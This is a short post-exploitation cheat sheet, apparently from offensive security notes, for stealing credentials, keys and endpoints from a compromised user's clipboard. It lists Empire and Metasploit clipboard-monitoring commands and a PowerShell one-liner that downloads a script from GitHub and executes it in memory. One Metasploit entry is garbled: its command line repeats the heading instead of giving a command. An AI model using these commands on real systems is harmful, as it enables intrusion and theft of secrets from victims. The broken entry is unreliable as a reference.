# Clipboard

In some cases, we may find important information like credentials, keys or endpoints copied by the compromised user in his clipboard. 

### 1) Empire C2

    usemodule powershell/collection/clipboard_monitor

### 2) Powershell

    Get-Clipboard

### 3) Get-ClipboardContents

    iex (iwr -usebasicparsing https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/collection/Get-ClipboardContents.ps1);Get-ClipboardContents

### 4) Metasploit

    load extapi

##### Read the target's current clipboard (text, files, images)

    clipboard_get_data

##### Dump all captured clipboard content

    clipboard_monitor_dump

##### Pause the active clipboard monitor

    clipboard_monitor_pause

##### Delete all captured clipboard content without dumping it

    clipboard_monitor_purge

##### Resume the paused clipboard monitor

    clipboard_monitor_resume

##### Start the clipboard monitor   

    Start the clipboard monitor

##### Stop the clipboard monitor   

    clipboard_monitor_stop

##### Write text to the target's clipboard    

    clipboard_set_text
